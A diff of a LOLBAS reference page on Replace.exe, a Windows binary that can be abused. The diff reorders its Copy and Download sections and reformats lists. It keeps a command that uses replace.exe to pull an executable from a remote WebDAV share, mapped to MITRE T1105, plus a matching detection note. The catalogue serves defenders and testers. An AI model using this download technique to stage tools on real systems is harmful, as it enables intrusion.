@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Replace/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Replace/#copy">Copy</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Replace/#copy">Copy</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Replace/#download">Download</a></li>
+	
 </ul>
 
+	
+
 <p>Used to replace file with another file</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,92 +57,72 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/elceef/status/986334113941655553">https://twitter.com/elceef/status/986334113941655553</a></li>
+	<a href="https://twitter.com/elceef/status/986334113941655553">https://twitter.com/elceef/status/986334113941655553</a>
+	<br>
 	
-	<li><a href="https://twitter.com/elceef/status/986842299861782529">https://twitter.com/elceef/status/986842299861782529</a></li>
+	<a href="https://twitter.com/elceef/status/986842299861782529">https://twitter.com/elceef/status/986842299861782529</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>elceef - <a href="https://twitter.com/@elceef">@elceef</a </li>
+	elceef - <a href="https://twitter.com/@elceef">@elceef</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Replace.exe getting files from remote server</li>
+	Replace.exe getting files from remote server
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Download/Copy bar.exe to outdir</p>
-
-		Usecase:Download file
-        <pre><code>replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="copy" class="function-name">Copy</h2>
-
-<p>The LOLBAS can copy file.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copy file.cab to destination</p>
-
+	
+<h2 id="copy" class ="function-name">Copy</h2>
+	
+		Copy file.cab to destination
+		<br>
+		<pre><code>replace.exe C:\Source\File.cab C:\Destination /A</code></pre>
 		Usecase:Copy files
-        <pre><code>replace.exe C:\Source\File.cab C:\Destination /A</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Download/Copy bar.exe to outdir
+		<br>
+		<pre><code>replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A</code></pre>
+		Usecase:Download file
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
